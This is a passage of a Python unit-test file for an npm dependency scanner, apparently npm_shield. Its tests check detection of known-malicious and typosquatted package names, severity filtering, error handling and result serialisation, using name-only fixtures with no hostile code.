                    "event-stream": "3.3.6",
                    "lodash": "^4.17.21",
                },
            },
        )
        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        malicious = [
            f for f in result.findings if f["detector"] == "known-malicious"
        ]
        assert len(malicious) >= 1
        assert any("event-stream" in f["package"] for f in malicious)

    def test_detects_typosquat_in_declared_deps(self, tmp_path: Path) -> None:
        project = _make_project(
            tmp_path,
            {
                "name": "my-app",
                "version": "1.0.0",
                "dependencies": {"lod4sh": "^4.17.20"},
            },
        )
        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        typo = [f for f in result.findings if f["detector"] == "typosquatting"]
        assert len(typo) >= 1

    def test_packages_analysed_from_declared_deps(self, tmp_path: Path) -> None:
        project = _make_project(
            tmp_path,
            {
                "name": "my-app",
                "version": "1.0.0",
                "dependencies": {
                    "lodash": "^4.17.21",
                    "express": "^4.18.2",
                    "axios": "^1.6.0",
                },
            },
        )
        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        assert result.packages_analysed == 3

    def test_no_node_modules_flag_when_absent(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        assert result.has_node_modules is False

    def test_empty_dependencies_no_crash(self, tmp_path: Path) -> None:
        project = _make_project(
            tmp_path, {"name": "empty-app", "version": "1.0.0"}
        )
        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        assert isinstance(result, ScanResult)
        assert result.finding_count == 0


# ---------------------------------------------------------------------------
# TestScannerErrorHandling
# ---------------------------------------------------------------------------


class TestScannerErrorHandling:
    """Tests for non-fatal error collection during scanning."""

    def test_errors_list_is_empty_on_clean_scan(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "lodash", "4.17.21")

        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        assert result.errors == []

    def test_errors_list_is_list_type(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        assert isinstance(result.errors, list)

    def test_scan_continues_after_detector_error(self, tmp_path: Path) -> None:
        """Even if one detector raises, others should still run."""
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "crossenv", "1.0.0")

        # Patch one detector to raise an exception
        with patch(
            "npm_shield.scanner.detect_typosquatting",
            side_effect=RuntimeError("Simulated detector failure"),
        ):
            result = Scanner(
                project_path=project, enable_credential_scan=False
            ).run_full()

        # The scan should complete (not crash)
        assert isinstance(result, ScanResult)
        # The error should be captured
        assert len(result.errors) >= 1
        assert any("typosquatting" in e for e in result.errors)

        # Other detectors should still have run
        malicious = [f for f in result.findings if f["detector"] == "known-malicious"]
        assert len(malicious) >= 1


# ---------------------------------------------------------------------------
# TestScanProjectConvenience
# ---------------------------------------------------------------------------


class TestScanProjectConvenience:
    """Tests for the scan_project() convenience function."""

    def test_returns_scan_result(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        result = scan_project(project, enable_credential_scan=False)
        assert isinstance(result, ScanResult)

    def test_accepts_string_path(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        result = scan_project(str(project), enable_credential_scan=False)
        assert isinstance(result, ScanResult)

    def test_raises_on_missing_path(self, tmp_path: Path) -> None:
        with pytest.raises(FileNotFoundError):
            scan_project(tmp_path / "nonexistent", enable_credential_scan=False)

    def test_raises_on_missing_package_json(self, tmp_path: Path) -> None:
        empty = tmp_path / "empty"
        empty.mkdir()
        with pytest.raises(FileNotFoundError):
            scan_project(empty, enable_credential_scan=False)

    def test_detects_findings_for_malicious_package(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "crossenv", "1.0.0")

        result = scan_project(project, enable_credential_scan=False)
        assert result.finding_count >= 1

    def test_min_severity_filter_applied(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "lod4sh", "4.17.20")  # high severity only

        result = scan_project(
            project, min_severity="critical", enable_credential_scan=False
        )
        # High findings should be filtered out when min is critical
        non_critical = [
            f
            for f in result.findings
            if f["severity"] != "critical"
        ]
        assert len(non_critical) == 0

    def test_osv_disabled_by_default(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        with patch("requests.Session.post") as mock_post:
            scan_project(project, enable_credential_scan=False)
        assert not mock_post.called

    def test_clean_project_no_findings(self, tmp_path: Path) -> None:
        project = _make_project(
            tmp_path,
            {
                "name": "clean-app",
                "version": "1.0.0",
                "dependencies": {"lodash": "^4.17.21"},
            },
        )
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "lodash", "4.17.21")

        result = scan_project(project, enable_credential_scan=False)
        assert result.finding_count == 0

    def test_result_project_name_matches(self, tmp_path: Path) -> None:
        project = _make_project(
            tmp_path, {"name": "convenience-test", "version": "3.0.0"}
        )
        result = scan_project(project, enable_credential_scan=False)
        assert result.project_name == "convenience-test"
        assert result.project_version == "3.0.0"

    def test_to_dict_from_convenience_function(self, tmp_path: Path) -> None:
        import json as _json

        project = _make_project(tmp_path)
        result = scan_project(project, enable_credential_scan=False)
        d = result.to_dict()
        # Should be JSON serialisable
        serialised = _json.dumps(d, default=str)
        reparsed = _json.loads(serialised)
        assert reparsed["project_name"] == "test-project"
